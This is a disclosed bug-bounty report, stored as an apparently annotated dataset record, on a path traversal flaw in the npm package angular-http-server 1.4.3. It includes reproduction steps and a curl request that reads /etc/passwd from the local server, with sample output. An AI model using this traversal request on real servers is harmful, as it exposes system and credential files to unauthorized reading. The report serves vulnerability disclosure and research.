{
    "reported_to": "Node.js third-party modules",
    "reported_by": "tungpun ",
    "title": "[angular-http-server] Server Directory Traversal",
    "content": "\nI would like to report a Server Directory Traversal vulnerability in angular-http-server.\nIt allows reading local files on the target server.\nModule\nmodule name: angular-http-server\nversion: 1.4.3\nnpm page: https://www.npmjs.com/package/angular-http-server\nModule Description\nA very simple application server designed for Single Page App (SPA) developers.\nIt returns a file to the browser if it exists (ex. your-icon.png, index.html) and if can't find a file that matches a given URL it re-directs you to index.html rather than giving a 404 error. The only time it will error out is if it can't locate the index.html file.\nOriginally designed for my Angular work, this server will work with any Single Page App (SPA) framework that uses a router to change the URL (React, Vue JS, Elm,...).\nSteps To Reproduce:\nInstall the module:\n$ npm i angular-http-server\nCreate the index file:\n$ echo \"hi\" > index.html\nStart the server:\n$ ./node_modules/angular-http-server/angular-http-server.js -p 6060\nUsing the below request to access the file /etc/passwd on the target server:\nCode 448 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'\n2\n3##\n4# User Database\n5#\n6# Note that this file is consulted directly only when the system is running\n7# in single-user mode.  At other times this information is provided by\n8# Open Directory.\n9#\n10# See the opendirectoryd(8) man page for additional information about\n11# Open Directory.\n12##\n13nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n14root:*:0:0:System Administrator:/var/root:/bin/sh\n15...\nSupporting Material/References:\nnode v8.10.0\nnpm 5.6.0\ncurl 7.54.0\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nIt allows reading local files on the target server\n\n",
    "severity": [
        8.6,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Path Traversal"
    ],
    "screenshots": {},
    "disclosed_date": 1524735720,
    "report_url": "https://hackerone.com/reports/330349",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install the module: $ npm i angular-http-server"
        ],
        [
            2,
            "Create the index file: $ echo \"hi\" > index.html"
        ],
        [
            3,
            "Start the server: $ ./node_modules/angular-http-server/angular-http-server.js -p 6060"
        ],
        [
            4,
            "Access the file /etc/passwd on the target server using: $ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'"
        ]
    ],
    "vuln_description": "The vulnerability is a Server Directory Traversal in angular-http-server, allowing an attacker to read local files on the target server by manipulating the URL path.",
    "reason": "The attack is straightforward, involving basic steps to set up the server and a simple curl command to exploit the vulnerability. There are no complex interactions or states involved, and the logic is common in directory traversal vulnerabilities.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}